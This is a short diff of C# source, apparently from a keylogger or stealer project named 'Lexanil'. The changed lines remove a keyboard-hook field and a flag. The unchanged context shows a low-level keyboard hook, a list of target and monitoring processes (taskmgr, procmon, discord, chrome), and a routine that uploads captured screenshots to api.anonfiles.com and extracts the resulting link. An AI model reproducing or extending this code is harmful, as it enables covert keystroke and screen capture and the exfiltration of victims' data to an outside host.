@@ -23,8 +23,6 @@ namespace Lexanil
         private static string[] processes = new[] { "iexplore", "steam", "explorer", "taskmgr", "procmon", "procmon64", "cmd", "discord", "chrome", "firefox" };
 
         private IntPtr ptrHook;
-        private LowLevelKeyboardProc objKeyboardProcess;
-        private bool foundSth = true;
 
         [StructLayout(LayoutKind.Sequential)]
         private struct KBDLLHOOKSTRUCT
@@ -232,7 +230,6 @@ namespace Lexanil
         {
             using (WebClient client = new WebClient())
             {
-                
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
                 var match = Regex.Match(response, @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
